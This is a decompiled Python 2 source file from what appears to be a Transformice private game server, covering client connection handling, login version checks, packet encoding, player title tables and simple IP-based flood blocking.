# Embedded file name: C:/Users/KoshTFM/Desktop/Pack 1.248 100%/Source.py
from datetime import datetime
import random
import re
import logging
import json
import os
import urllib2
import xml.parsers.expat
import sys
import struct
import smtplib
import threading
import time as thetime
import ast
import string
import fnmatch
from twisted.internet import reactor, protocol
from Package import *
from Package.Tokensbase import Tokenbase
from Package.Content import *
from Package.API import InitSet, adminModule
from Package.CommandsPackage import Commands
import hashlib
import glob
import traceback
dateNow = datetime.now()

def getTime():
    return thetime.time()


def getHours():
    Time = str(datetime.now())[11:].split(':')
    Time = Time[0] + ':' + Time[1] + ':' + Time[2][:2]
    return str(Time)


logging.basicConfig(filename='./Protetor.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
Setting = Tokenbase()
VERBOSE = False
LOGVERB = False
EXEVERS = False
VERSION = Setting.Version[:]
NAMESERVER = Setting.Name[:]
URLORIGIN = Setting.URL[:]
CKEY = Setting.ConnectionKey[:]
COMPILE = Setting.PycCompile
DEBUGM = Setting.Debug
LEVEL_LIST = range(0, 134 + 1) + range(136, 143 + 1) + range(200, 210 + 1)
COMMUNITY = Setting.COMMUNITY[:]
if EXEVERS:
    VERBOSE = False

class TransformiceClientHandler(Protocol.TFMClientProtocol):

    def __init__(self):
        self.buffer = ''
        self.MDT = ''
        self.currentPacketPos = 0
        self.packetQueue = []
        self.partialPacketHold = False
        self.validatingVersion = True
        self.validatingLoader = False
        self.loaderInfoUrl = ''
        self.stageloaderInfobytesTotal = '0'
        self.stageloaderInfobytesLoaded = '0'
        self.loaderInfobytesTotal = '0'
        self.loaderInfobytesLoaded = '0'
        self.Langue = 'br'
        self.LangueByte = '\x04'
        self.LangueId = 0
        self.cafeID = 0
        self.Translating = False
        self.computer = ''
        self.flashvers = ''
        self.username = ''
        self.friendsList = ''
        self.playerCode = -1
        self.cppid = -1
        self.privilegeLevel = 0
        self.gender = 0
        self.marriage = ''
        self.room = None
        self.MyTimer = None
        self.chatdisabled = False
        self.modoPwet = False
        self.isBanned = False
        self.isFrozen = False
        self.isFrozenTimer = None
        self.isShaman = False
        self.isDead = False
        self.duckCheckCounter = 0
        self.forumid = '1'
        self.racingStats = [0,
         0,
         0,
         0]
        self.hasCheese = False
        self.modoCafe = False
        self.isAfk = True
        self.isSyncroniser = False
        self.score = 0
        self.isMapcrew = False
        self.isNewbie = False
        self.isFacingRight = False
        self.pX = 0
        self.pY = 0
        self.movingRight = False
        self.movingLeft = False
        self.Vx = 0
        self.Vy = 0
        self.isJumping = False
        self.Health = 4
        self.Strength = 2
        self.avatar = 0
        self.voteban = []
        self.votemute = 0
        self.mumute = False
        self.modmute = False
        self.TempBan = False
        self.roomname = ''
        self.lastmessage = ''
        self.isinit = True
        self.sentinelle = False
        self.sentcount = 0
        self.loadercheck = True
        self.sentcount = 0
        self.chatcolored = False
        self.chatcolor = None
        self.logonsuccess = False
        self.wrongPasswordAttempts = 0
        self.isIPban = 'NotChecked'
        self.isInTribe = False
        self.giftCount = 0
        self.isIceCount = 0
        self.isAmbulance = 0
        self.hasEnter = False
        self.isTransformation = False
        self.personalTp = False
        self.respawn = False
        self.opportunist = False
        self.isZombie = False
        self.titleNumber = 0
        self.SPEC = False
        self.Voted = False
        self.QualifiedVoter = False
        self.ATEC_Time = None
        self.AWKE_Time = self.getTimer() * 1000
        self.playerStartTime = None
        self.NoDataTimer = None
        self.JumpCheck = 1
        self.canMeep = False
        self.AwakeTimerKickTimer = None
        self.parseByte = ByteArray
        self.Opcodes = Opcodes.ParseTokens
        self.OpcodesUTF = OpcodesUTF.ParseTokens
        return

    def getPlayerID(self, username):
        if username.startswith('*'):
            return '1'
        else:
            self.Database.execute('select id from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return -1
            return rrf[0]
            return

    def sendNewBinofItens(self, type, ax = 200, ay = 200, vx = 0, vy = 0):
        if int(self.mdir) in (1,):
            X, Y, ax, ay, vx, vy = (self.posX + 10,
             self.posY - 20,
             -ax,
             ay,
             vx,
             vy)
        elif int(self.mdir) in (0,):
            X, Y, ax, ay, vx, vy = (self.posX + 10,
             self.posY - 20,
             ax,
             ay,
             vx,
             vy)
        data = struct.pack('!bhhhhhh', int(type), int(X), int(Y), int(ax), int(ay), int(vx), int(vy))
        self.room.sendAllBin('\x1d\x1b', data)

    def setVideoInTheRoom(self, id):
        if not int(id) == 0 and not str(id) == '':
            for values in self.room.sentMusic.values():
                if int(values['ID']) == id:
                    self.room.currentMusicID = int(values['ID'])
                    bool = struct.pack('!h', len(values['Link'])) + values['Link']
                    bool += struct.pack('!h', len(values['Title'])) + values['Title']
                    bool += struct.pack('!i', len(values['By'])) + values['By']
                    self.room.sendAllBin('\x05H' + bool)

    def sendDeleteMusicForPlayList(self, id):
        for values in self.room.sentMusic.values():
            if values['ID'] == id:
                del self.room.sentMusic[str(id)]

    def sendWorkSelfAfterLogin(self):
        self.ShopModule = Shop.shopModule(self)
        self.Tribulle = Tribulle.Tribulle(self)
        self.ModopwetModule = ModoPwet.modoPwet(self)

    def sendWorkSelf(self):
        self.VERSION = VERSION
        self.NAMESERVER = NAMESERVER
        self.Welcome = Welcome
        self.WelcomeOthers = WelcomeOthers
        self.SkillModule = SkillModule.skillModule(self)
        self.ParseCommand = Commands.parseCommand(self)
        self.MusicModule = Music.music(self)
        self.modoPwet = False
        self.ModuleTeam = False
        self.silence = False
        self.silenceData = ''
        self.muteTribe = False
        self.censorChat = False
        self.muteChat = False
        self.isHidden = False
        self.defilantePoints = 0
        self.EmailAddress = ''
        self.UsernameRecoveryPass = ''
        self.ValidatedEmail = False
        self.LastEmailCode = 'WWWWW'
        self.ValidatedPassChange = False
        self.TribeName = ''
        self.TribeRank = ''
        self.TribeCode = ''
        self.TribeInfo = []
        self.MyChats = []
        self.TribeMessage = ''
        self.TribeFromage = 0
        self.Triberanked = 0
        self.AcceptableInvites = []
        self.RTNail = False
        self.RTotem = False
        self.UTotem = False
        self.STotem = [0, '']
        self.Totem = [0, '']
        self.LoadCountTotem = False
        self.ShamDivine = False
        self.color1 = '78583a'
        self.color2 = '95d9d6'
        self.Election = ''
        self.Badges = ''
        self.shopBadgeCheckList = [2227,
         2208,
         2202,
         2209,
         2210,
         2228,
         2218,
         2206,
         2219,
         2229,
         2230,
         2231,
         2232,
         2223,
         2224,
         2217,
         2213,
         2234,
         2211,
         2220]
        self.shopBadgeDictionary = {2227: 2,
         2208: 3,
         2202: 4,
         2209: 5,
         2210: 19,
         2228: 8,
         2218: 10,
         2206: 11,
         2219: 12,
         2229: 13,
         2230: 14,
         2231: 15,
         2232: 20,
         2223: 26,
         2224: 21,
         2217: 22,
         2213: 23,
         2234: 27,
         2211: 24,
         2220: 25}
        self.floodControl = 0
        self.floodControlTime = 0
        self.isFloodCount = 0
        self.floodShamanSpawn = 0
        self.ChatBlockedTime = 0
        self.ChatBlockedCount = 0
        self.isTimeShamanSpawn = 0
        self.survivorStats = [0,
         0,
         0,
         0]
        self.cheeseTitleCheckList = [5,
         20,
         100,
         200,
         300,
         400,
         500,
         600,
         700,
         800,
         900,
         1000,
         1100,
         1200,
         1300,
         1400,
         1500,
         1600,
         1700,
         1800,
         2000,
         2300,
         2700,
         3200,
         3800,
         4600,
         6000,
         7000,
         8000,
         9001,
         10000,
         14000,
         18000,
         22000,
         26000,
         30000,
         34000,
         38000,
         42000,
         46000,
         50000,
         55000,
         60000,
         65000,
         70000,
         75000,
         80000]
        self.cheeseTitleDictionary = {5: 5,
         20: 6,
         100: 7,
         200: 8,
         300: 35,
         400: 36,
         500: 37,
         600: 26,
         700: 27,
         800: 28,
         900: 29,
         1000: 30,
         1100: 31,
         1200: 32,
         1300: 33,
         1400: 34,
         1500: 38,
         1600: 39,
         1700: 40,
         1800: 41,
         2000: 72,
         2300: 73,
         2700: 74,
         3200: 75,
         3800: 76,
         4600: 77,
         6000: 78,
         7000: 79,
         8000: 80,
         9001: 81,
         10000: 82,
         14000: 83,
         18000: 84,
         22000: 85,
         26000: 86,
         30000: 87,
         34000: 88,
         38000: 89,
         42000: 90,
         46000: 91,
         50000: 92,
         55000: 234,
         60000: 235,
         65000: 236,
         70000: 237,
         75000: 238,
         80000: 93}
        self.firstTitleCheckList = [1,
         10,
         100,
         200,
         300,
         400,
         500,
         600,
         700,
         800,
         900,
         1000,
         1100,
         1200,
         1400,
         1600,
         1800,
         2000,
         2200,
         2400,
         2600,
         2800,
         3000,
         3200,
         3400,
         3600,
         3800,
         4000,
         4500,
         5000,
         5500,
         6000,
         7000,
         8000,
         9000,
         10000,
         12000,
         14000,
         16000,
         18000,
         20000,
         25000,
         30000,
         35000,
         40000]
        self.firstTitleDictionary = {1: 9,
         10: 10,
         100: 11,
         200: 12,
         300: 42,
         400: 43,
         500: 44,
         600: 45,
         700: 46,
         800: 47,
         900: 48,
         1000: 49,
         1100: 50,
         1200: 51,
         1400: 52,
         1600: 53,
         1800: 54,
         2000: 55,
         2200: 56,
         2400: 57,
         2600: 58,
         2800: 59,
         3000: 60,
         3200: 61,
         3400: 62,
         3600: 63,
         3800: 64,
         4000: 65,
         4500: 66,
         5000: 67,
         5500: 68,
         6000: 69,
         7000: 231,
         8000: 232,
         9000: 233,
         10000: 70,
         12000: 224,
         14000: 225,
         16000: 226,
         18000: 227,
         20000: 202,
         25000: 228,
         30000: 229,
         35000: 230,
         40000: 71}
        self.shamanTitleCheckList = [10,
         100,
         1000,
         2000,
         3000,
         4000,
         5000,
         6000,
         7000,
         8000,
         9000,
         10000,
         11000,
         12000,
         13000,
         14000,
         15000,
         16000,
         18000,
         20000,
         22000,
         24000,
         26000,
         28000,
         30000,
         35000,
         40000,
         45000,
         50000,
         55000,
         60000,
         65000,
         70000,
         75000,
         80000,
         85000,
         90000,
         100000,
         140000]
        self.shamanTitleDictionary = {10: 1,
         100: 2,
         1000: 3,
         2000: 4,
         3000: 13,
         4000: 14,
         5000: 15,
         6000: 16,
         7000: 17,
         8000: 18,
         9000: 19,
         10000: 20,
         11000: 21,
         12000: 22,
         13000: 23,
         14000: 24,
         15000: 25,
         16000: 94,
         18000: 95,
         20000: 96,
         22000: 97,
         24000: 98,
         26000: 99,
         28000: 100,
         30000: 101,
         35000: 102,
         40000: 103,
         45000: 104,
         50000: 105,
         55000: 106,
         60000: 107,
         65000: 108,
         70000: 109,
         75000: 110,
         80000: 111,
         85000: 112,
         90000: 113,
         100000: 114,
         140000: 115}
        self.shopTitleCheckList = [1,
         2,
         4,
         6,
         8,
         10,
         12,
         14,
         16,
         18,
         20,
         22]
        self.shopTitleDictionary = {1: 115,
         2: 116,
         4: 117,
         6: 118,
         8: 119,
         10: 120,
         12: 121,
         14: 122,
         16: 123,
         18: 124,
         20: 125,
         22: 126}
        self.noelGiftTitleCheckList = [1,
         10,
         20,
         30,
         40,
         60,
         80,
         100,
         120,
         140,
         160,
         180,
         200,
         220,
         240,
         500]
        self.noelGiftTitleDictionary = {1: 127,
         10: 288,
         20: 128,
         30: 129,
         40: 289,
         60: 130,
         80: 240,
         100: 290,
         120: 241,
         140: 242,
         160: 291,
         180: 243,
         200: 244,
         220: 245,
         240: 292,
         500: 293}
        self.valentinGiftTitleCheckList = [5, 30, 60]
        self.valentinGiftTitleDictionary = {5: 210,
         30: 211,
         60: 212}
        self.hardShamTitleCheckList = [500,
         2000,
         4000,
         7000,
         10000,
         14000,
         18000,
         22000,
         26000,
         30000,
         40000]
        self.hardShamTitleDictionary = {500: 213,
         2000: 214,
         4000: 215,
         7000: 216,
         10000: 217,
         14000: 218,
         18000: 219,
         22000: 220,
         26000: 221,
         30000: 222,
         40000: 223}
        self.bootcampTitleCheckList = [1,
         3,
         5,
         7,
         10,
         15,
         20,
         25,
         30,
         40,
         50,
         60,
         70,
         80,
         90,
         100,
         120,
         140,
         160,
         180,
         200,
         250,
         300,
         350,
         400,
         500,
         600,
         700,
         800,
         900,
         1000]
        self.bootcampTitleDictionary = {1: 256,
         3: 257,
         5: 258,
         7: 259,
         10: 260,
         15: 261,
         20: 262,
         25: 263,
         30: 264,
         40: 265,
         50: 266,
         60: 267,
         70: 268,
         80: 269,
         90: 270,
         100: 271,
         120: 272,
         140: 273,
         160: 274,
         180: 275,
         200: 276,
         250: 277,
         300: 278,
         350: 279,
         400: 280,
         500: 281,
         600: 282,
         700: 283,
         800: 284,
         900: 285,
         1000: 286}
        self.divineShamTitleCheckList = [500,
         2000,
         4000,
         7000,
         10000,
         15000,
         21000,
         27000,
         33000,
         39000,
         45000]
        self.divineShamTitleDictionary = {500: 324,
         2000: 326,
         4000: 327,
         7000: 328,
         10000: 329,
         15000: 330,
         21000: 331,
         27000: 332,
         33000: 333,
         39000: 334,
         45000: 335}

    def sendnewpowers(self):
            data = ""
            list = "1011,3,1,1,0,1,0;1010,3,1,1,0,1,0;1111,3,1,1,0,1,0;1110,3,1,1,0,1,0;1211,3,1,1,0,1,0;1210,3,1,1,0,1,0;1311,3,1,1,0,1,0;1310,3,1,1,0,1,0;1411,3,1,1,0,1,0;1410,3,1,1,0,1,0;1911,3,1,1,0,1,0;1910,3,1,1,0,1,0;1811,3,1,1,0,1,0;1810,3,1,1,0,1,0;1711,3,1,1,0,1,0;1710,3,1,1,0,1,0;1511,3,1,1,0,1,0;1510,3,1,1,0,1,0;1610,2,1,1,0,1,0;1611,2,1,0,0,1,0"
            list += ";1,"+str(self.numberofnewpowers[0])+",0,1,1,1,0;2,"+str(self.numberofnewpowers[1])+",0,1,1,1,0;3,"+str(self.numberofnewpowers[2])+",0,1,1,1,0;4,"+str(self.numberofnewpowers[3])+",0,1,1,1,0;5,"+str(self.numberofnewpowers[4])+",0,1,1,1,0"
            invent = list.split(";")
            data = data + struct.pack("!h", len(invent))
            for x in invent:
                item, quant,select, byte1, equipe, byte4, byte5=map(int, x.split(","))
                data = data + struct.pack("!hbbbbbb", item, quant, select, byte1,equipe,byte4,byte5)
            self.sendData("\x1f\x01" + data, [], True)

    def sendInventori(self):
            data = ""
            list = "1011,3,1,1,0,1,0;1010,3,1,1,0,1,0;1111,3,1,1,0,1,0;1110,3,1,1,0,1,0;1211,3,1,1,0,1,0;1210,3,1,1,0,1,0;1311,3,1,1,0,1,0;1310,3,1,1,0,1,0;1411,3,1,1,0,1,0;1410,3,1,1,0,1,0;1911,3,1,1,0,1,0;1910,3,1,1,0,1,0;1811,3,1,1,0,1,0;1810,3,1,1,0,1,0;1711,3,1,1,0,1,0;1710,3,1,1,0,1,0;1511,3,1,1,0,1,0;1510,3,1,1,0,1,0;1610,2,1,1,0,1,0;1611,2,1,0,0,1,0"
            list += ";1,"+str(self.numberofnewpowers[0])+",0,1,1,1,0;2,"+str(self.numberofnewpowers[1])+",0,1,1,1,0;3,"+str(self.numberofnewpowers[2])+",0,1,1,1,0;4,"+str(self.numberofnewpowers[3])+",0,1,1,1,0;5,"+str(self.numberofnewpowers[4])+",0,1,1,1,0"
            invent = list.split(";")
            data = data + struct.pack("!h", len(invent))
            for x in invent:
                item, quant,select, byte1, equipe, byte4, byte5=map(int, x.split(","))
                data = data + struct.pack("!hbbbbbb", item, quant, select, byte1,equipe,byte4,byte5)
            self.sendData("\x1f\x01" + data, [], True)

    def connectionMade(self):
        if sys.platform.startswith('win'):
            self.address = self.transport.getPeer()
            self.address = [self.address.host]
        else:
            self.address = self.transport.getHandle().getpeername()
        if os.path.exists('./Data/text_tools/badips.txt'):
            BadIPS = str(open('./Data/text_tools/badips.txt', 'r').read()).split(', ')
        else:
            print 'File: badips.txt >> Installed'
            fo = open('./Data/text_tools/badips.txt', 'wb')
            fo.write('10.0.0.1')
            fo.close()
            BadIPS = ['10.0.0.1']
        if self.address[0] in BadIPS:
            print 'IP Block: %s' % self.address[0]
            self.transport.loseConnection()
        else:
            self.server = self.factory
            self.Database = self.server.Database
            try:
                derp = self.server.connectCounts[self.address[0]]
                self.server.connectCounts[self.address[0]]['count'] += 1
            except:
                self.server.connectCounts[self.address[0]] = {'count': 1}

            if self.server.getIPPermaBan(self.address[0]):
                self.transport.loseConnection()
                self.isIPban = True
                self.isBanned = True
                data = ''
            elif self.address[0] in self.server.tempIPBanList:
                self.transport.loseConnection()
                self.isIPban = True
                self.isBanned = True
                data = ''
            if self.server.connectCounts[self.address[0]]['count'] >= 12:
                now = datetime.now()
                if self.address[0] in BadIPS:
                    pass
                else:
                    with open('./Data/text_tools/badips.txt', 'r+') as f:
                        old = f.read()
                        f.seek(0)
                        f.write('' + str(self.address[0]) + ', ' + old)
                self.server.tempIPBanList.append(self.address[0])
                self.server.sendModChat(self, '\x06\x14', ['<N>DOS Ataque Bloqueado em IP: [<CH>' + str(self.address[0]) + '<N>]'])
                self.server.connectCounts[self.address[0]] = {'count': 1}
                with open('./KiwiGuard/Data/Block_IPList.kwg', 'r+') as f:
                    old = f.read()
                    f.seek(0)
                    f.write('' + str(now.strftime('%m/%d/%Y %I:%M:%S %p')) + '|' + str(self.address[0]) + '|0\n' + old)
                    logging.warning('KiwiGuard Firewall Detected: (DOS form IP ' + self.address[0] + '), Act: Disconnect He and Ban Perma IP.')
                    self.transport.loseConnection()
            else:
                self.validatingLoader = self.server.ValidateLoader
                self.shoplist = self.server.shopList
                self.NoDataTimer = reactor.callLater(7, self.transport.loseConnection)
                if VERBOSE:
                    print '[' + str(datetime.today()) + '] ' + 'Interface de login enviada para ' + str(self.address[0])
                self.SGMDT = [0,
                 0,
                 0,
                 0,
                 0,
                 0,
                 0,
                 0,
                 0,
                 0]
                LCDMT = str(self.server.LCDMT)
                self.CMDTEC = random.randrange(1000, 9999)
                self.ICMDTEC = self.CMDTEC
                i = 0
                while i < 10:
                    self.CMDT = LCDMT[i]
                    if self.CMDT == '0':
                        self.SGMDT[i] = '10'
                    else:
                        self.SGMDT[i] = self.CMDT
                    i = i + 1

    def inforequestReceived(self, data):
        if self.NoDataTimer:
            try:
                self.NoDataTimer.cancel()
            except:
                self.NoDataTimer = None

        if self.isBanned:
            data = ''
            self.transport.loseConnection()
        self.buffer += data
        if self.buffer == '<policy-file-request/>\x00':
            if self.server.getIPPermaBan(self.address[0]):
                self.transport.loseConnection()
                self.isIPban = True
                self.isBanned = True
                data = ''
            elif self.address[0] in self.server.tempIPBanList:
                self.transport.loseConnection()
                self.isIPban = True
                self.isBanned = True
                data = ''
            self.isIPban = False
            self.transport.write('<cross-domain-policy><allow-access-from domain="*" to-ports="*" /></cross-domain-policy>' + '\x00')
            self.transport.loseConnection()
        elif data.startswith('player-api-'):
            username = str(data[11:]).lower().capitalize()
            if len(username) < 3 or len(username) > 12:
                self.transport.loseConnection()
            elif not username.isalpha():
                self.transport.loseConnection()
            elif self.server.checkExistingUsers(username):
                p = ByteArray.ByteArray()
                player = self.server.getApiPlayerData(username)
                tribe_name = ''
                tribe_code = -1
                if self.server.getTribeInfo(username):
                    UserTribeInfo = self.server.getUserTribeInfo(username)
                    TribeData = self.server.getTribeData(UserTribeInfo[0])
                    tribe_code = TribeData[0]
                    tribe_name = TribeData[1]
                    TribeData = None
                    UserTribeInfo = None
                p.writeUTF(username)
                p.writeInt(player[0])
                p.writeInt(player[1])
                p.writeByte(player[2])
                p.writeInt(player[3])
                p.writeInt(player[4])
                p.writeInt(player[5])
                p.writeInt(player[6])
                p.writeShort(player[7])
                p.writeInt(player[8])
                p.writeInt(player[9])
                p.writeInt(tribe_code)
                p.writeUTF(tribe_name)
                self.transport.write('\x01' + p.toString())
                self.transport.loseConnection()
            else:
                self.transport.loseConnection()
        return

    def parseSentinelle(self, data):
        pass

    def sentinelleSendStat(self):
        pass

    def sentinelleSendCPU(self):
        self.sentcount = self.sentcount + 1
        if self.sentcount > 1200:
            self.transport.loseConnection()
            if self.sentinelleSendCPUTimer:
                try:
                    self.sentinelleSendCPUTimer.cancel()
                except:
                    self.sentinelleSendCPUTimer = None

            if self.sentinelleSendStatTimer:
                try:
                    self.sentinelleSendStatTimer.cancel()
                except:
                    self.sentinelleSendStatTimer = None

        return

    def stringReceived(self, packet):
        if self.NoDataTimer:
            try:
                self.NoDataTimer.cancel()
            except:
                self.NoDataTimer = None

        self.currentPacketPos = struct.unpack('!b', packet[:1])[0]
        data = packet[1:]
        if self.isBanned:
            data = ''
            self.transport.loseConnection()
        else:
            self.found_terminator(data)
        return

    def found_terminator(self, data):
        if self.validatingVersion:
            if self.server.getIPPermaBan(self.address[0]):
                self.transport.loseConnection()
                self.isIPban = True
                self.isBanned = True
                data = ''
            elif self.address[0] in self.server.tempIPBanList:
                self.transport.loseConnection()
                self.isIPban = True
                self.isBanned = True
                data = ''
            else:
                self.isIPban = False
            if VERBOSE:
                print 'RECV: ' + repr(data)
            if data.startswith('\x1c\x01'):
                try:
                    pkt = ByteArray.ByteArray(data[2:])
                    version = pkt.readShort()
                    key = pkt.readUTF()
                    client = pkt.readUTF()
                    utiliSateur = pkt.readUTF()
                    chargeur = pkt.readInt()
                    empty_string = pkt.readUTF()
                    h = pkt.readUTF()
                    serverString = pkt.readUTF()
                    unk1 = pkt.readInt()
                    _getTimer = pkt.readInt()
                except:
                    self.server.sendModChat(self, '\x06\x14', ['Cliente invalido: ' + str(self.address[0])])
                    self.transport.loseConnection()
                finally:
                    dictVers = {}
                    saveThis = False
                    ip = self.address[0]
                    if key != CKEY:
                        saveThis = True
                        if ip in dictVers:
                            pass
                        else:
                            dictVers[ip] = {}
                        dictVers[ip]['client_key'] = key
                        dictVers[ip]['server_key'] = CKEY
                        dictVers[ip]['version'] = version
                    if empty_string != '':
                        saveThis = True
                        self.server.sendModChat(self, '\x06\x14', ['Cliente invalido: ' + str(self.address[0])])
                    if saveThis:
                        aq = open('./errores/VersionIncorrect.log', 'a')
                        aq.write(str(dictVers))
                        self.transport.loseConnection()
                    if self.isinit:
                        self.isinit = False
                        self.sendCorrectVersion()
                        self.AwakeTimerKickTimer = reactor.callLater(600, self.AwakeTimerKick)
                    if self.server.ValidateVersion:
                        self.transport.loseConnection()
                    self.validatingVersion = False

            else:
                if data == '':
                    if os.path.exists('./Data/text_tools/badips.txt'):
                        BadIPS = str(open('./Data/text_tools/badips.txt', 'r').read()).split(', ')
                    else:
                        print 'File: badips.txt >> Installed'
                        fo = open('./Data/text_tools/badips.txt', 'wb')
                        fo.write('10.0.0.1')
                        fo.close()
                    now = datetime.now()
                    if self.address[0] in BadIPS:
                        self.transport.loseConnection()
                    else:
                        with open('./Data/text_tools/badips.txt', 'r+') as f:
                            old = f.read()
                            f.seek(0)
                            f.write('' + str(self.address[0]) + ', ' + old)
                    print 'DOS Attack Blocked in IP: [' + str(self.address[0]) + ']'
                    with open('./KiwiGuard/Data/Block_IPList.kwg', 'r+') as f:
                        old = f.read()
                        f.seek(0)
                        f.write('' + str(now.strftime('%m/%d/%Y %I:%M:%S %p')) + '|' + str(self.address[0]) + '|0\n' + old)
                        logging.warning('KiwiGuard Firewall Detected: (DOS form IP ' + self.address[0] + '), Act: Disconnect He and Ban Perma IP.')
                self.transport.loseConnection()
        else:
            self.parseData(data)

    def parseData(self, data):
        self.CMDTEC += 1
        if self.CMDTEC == self.ICMDTEC + 9000:
            self.CMDTEC = self.ICMDTEC
        if self.isFrozen:
            eventTokens = data[:2]
            data = data[2:]
            eventToken1, eventToken2 = eventTokens
        else:
            eventTokens = data[:2]
            data = data[2:]
            eventToken1, eventToken2 = eventTokens
            try:
                self.Opcodes(self, eventTokens, eventToken1, eventToken2, data)
            except Exception as error:
                c = open('./errores/errors.log', 'a')
                c.write('\n' + '=' * 40 + '\n')
                c.write('- Hora: %s\n- IP: %s\n- Jogador: %s\n- Error: \n' % (getHours(), self.address[0], self.username))
                traceback.print_exc(file=c)
                c.close()
                print "[ERROR] The Player %s has been dropped for an error. See in 'errors.log'." % self.username
                self.sendPlayerBan(0, 'OPS ! O Servidor reportou um erro e voc\xea foi desconectado ;( Contate um Administrador.', True)
                if self.room != None:
                    self.sendPlayerDisconnect(self.playerCode)

        return

    def parseDataUTF(self, data):
        values = data.split('\x01')
        eventTokens = values.pop(0)
        eventToken1, eventToken2 = eventTokens
        self.OpcodesUTF(self, eventTokens, eventToken1, eventToken2, values)

    def connectionLost(self, status):
        if self.room:
            self.room.removeClient(self)
        try:
            derp = self.server.connectCounts[self.address[0]]
            self.server.connectCounts[self.address[0]]['count'] -= 1
        except:
            self.server.connectCounts[self.address[0]] = {'count': 0}

        if self.username != '':
            if len(self.friendsList) > 0:
                for i, v in enumerate(self.friendsList):
                    self.Tribulle.sendFriendDisconnection(v, self.username)

            if self.isInTribe:
                self.Tribulle.sendTribeDisconnected()
            if self.privilegeLevel in (8, 6, 5, 4):
                try:
                    if self.Langue in self.server.ModList:
                        self.server.ModList[self.Langue].remove(self.username)
                    self.server.checkIfModOnlines()
                except:
                    pass

                self.room.sendModChatOthers(self, '\x1a\x05', ['-', self.username + ' saiu.'])
            if self.privilegeLevel in (3,):
                self.room.sendArbChatOthers(self, '\x1a\x06', ['-', self.username + ' has left.'])
            if self.username in self.server.reportCache:
                if self.server.reportCache[self.username]['status'] not in ('banned',):
                    self.server.reportCache[self.username]['status'] = 'Offline'
        if self.AwakeTimerKickTimer:
            try:
                self.AwakeTimerKickTimer.cancel()
            except:
                self.AwakeTimerKickTimer = None

        if VERBOSE:
            print '[' + str(datetime.today()) + '] ' + 'Conex\xc3\xa3o interrompida: ' + str(self.address[0])
        self.transport.loseConnection()
        return

    def getDefaultLook(self):
        return '1;0,0,0,0,0,0,0,0,0'

    def sendClientBin(self, eventTokens, data = None):
        self.sendData(eventTokens, data, True)

    def sendData(self, eventCodes, data = None, binary = None):
        if VERBOSE:
            print 'SEND:', repr(eventCodes), repr(data), binary
        data = '' if data == [] or data == None else data
        packetData = None
        if not binary:
            packetData = chr(1).join(map(str, [eventCodes] + data) if data else map(str, [eventCodes]))
        length = int(len(str(eventCodes) + str(data))) if binary else int(len(str(packetData)) + 6)
        packet = self.parseByte.ByteArray()
        if length <= 255:
            packet.writeByte(1)
            packet.writeUnsignedByte(length)
        elif length <= 65535:
            packet.writeByte(2)
            packet.writeUnsignedShort(length)
        elif length <= 16777215:
            packet.writeByte(3)
            packet.writeUnsignedByte(length >> 18 & 255)
            packet.writeUnsignedByte(length >> 8 & 255)
            packet.writeUnsignedByte(length & 255)
        if not packet.toString() == '':
            if binary:
                packet.writeBytes(eventCodes + data)
            else:
                packet.writeBytes(chr(1) + chr(1))
                packet.writeShort(len(packetData))
                packet.writeBytes(packetData)
                packet.writeShort(0)
        self.transport.write(packet.toString())
        return

    def sendDataOld(self, eventCodes, data = None):
        if data:
            self.transport.write('\x01'.join(map(str, [eventCodes] + data)) + '\x00')
        else:
            self.transport.write(eventCodes + '\x00')

    def sendHealth(self, health):
        self.Health = int(health)
        self.sendData('\x1a\x04', chr(health), True)

    def sendZombieMode(self, fosse = None):
        self.room.ZombieRoom = True
        self.isZombie = True
        if self.isShaman:
            lol = 'runbin 01010005081401345'
            data = str(lol.split(' ', 1)[1]).replace(' ', '')
            eventcodes = data[:4]
            data = data[4:]
            self.room.sendAllBin(self.HexToByte(eventcodes), self.HexToByte(data))
        self.room.sendAllBin('\x08B', struct.pack('!l', int(self.playerCode)))
        self.isZombie = True

    def sendAnuncio(self):
        pass

    def chatMessage(self, message):
        self.sendData('\x06\t', struct.pack('!h' + str(len(message)) + 's', len(message), message), True)

    def sendMessage(self, message):
        self.sendData('\x06\t' + struct.pack('!h', len(message)) + message, [], True)

    def sendCorrectVersion(self):
        p = ByteArray.ByteArray()
        p.writeInt(self.server.getConnectedPlayerCount())
        p.writeByte(self.currentPacketPos)
        p.writeUTF(self.Langue)
        p.writeUTF(self.Langue)
        p.writeShort(124)
        p.writeShort(59)
        p.writeShort(12)
        p.writeShort(48)
        self.sendData('\x1a\x03', p.toString(), True)

    def sendGameMode(self, mode):
        mode = 1 if mode == 0 else mode
        packet = ByteArray.ByteArray()
        for x in [8,
         1,
         3,
         8,
         9,
         11,
         2,
         10,
         18]:
            packet.writeByte(x)

        modeInfo = self.server.getPlayersCountMode(mode)
        packet.writeByte(mode)
        packet.writeByte(1)
        if modeInfo[0] != '':
            packet.writeUTF(modeInfo[0])
            packet.writeUTF(str(modeInfo[1]))
            packet.writeUTF('mjj')
            packet2 = ByteArray.ByteArray()
            count = 0
            for room in self.server.rooms.values():
                checks = {1: room.isNorm,
                 3: room.isVanilla,
                 8: room.isSurvivor,
                 9: room.isRacing,
                 11: room.isMusic,
                 2: room.isBootcamp,
                 10: room.isDefilante}
                check = checks[mode]
                if check and room.community.lower() == self.Langue.lower() and room.getPlayerCount() >= 5:
                    count += 1
                    packet2.writeByte(0)
                    packet2.writeUTF(room.namewithout)
                    packet2.writeShort(room.getPlayerCount())
                    packet2.writeUnsignedByte(150)

            if count == 0:
                prefixs = {1: '',
                 3: 'vanilla',
                 8: 'survivor',
                 9: 'racing',
                 11: 'music',
                 2: 'bootcamp',
                 10: 'defilante'}
                prefix = prefixs[mode]
                packet.writeUTF('1')
                packet.writeByte(0)
                packet.writeUTF(prefix + '1')
                packet.writeShort(0)
                packet.writeUnsignedByte(150)
            else:
                packet.writeUTF(str(count))
                packet.writeBytes(packet2.toString())
        else:
            minigamesList = {}
            minigames = self.server.getMinigamesList()
            for minigame in minigames:
                players = 0
                for room in self.server.rooms.values():
                    if room.namewithout.startswith(minigame) or room.namewithout.startswith('*' + minigame):
                        players += room.getPlayerCount()

                minigamesList[minigame] = players

            count = len(minigamesList)
            finalList = []
            for x in range(count):
                try:
                    name = max(minigamesList.iterkeys(), key=lambda y: minigamesList[y])
                    finalList.append([x, name, minigamesList[name]])
                    del minigamesList[name]
                except:
                    pass

            for x in range(count):
                packet.writeUTF(str(finalList[x][1]))
                packet.writeShort(finalList[x][2])
                packet.writeUTF('mjj')
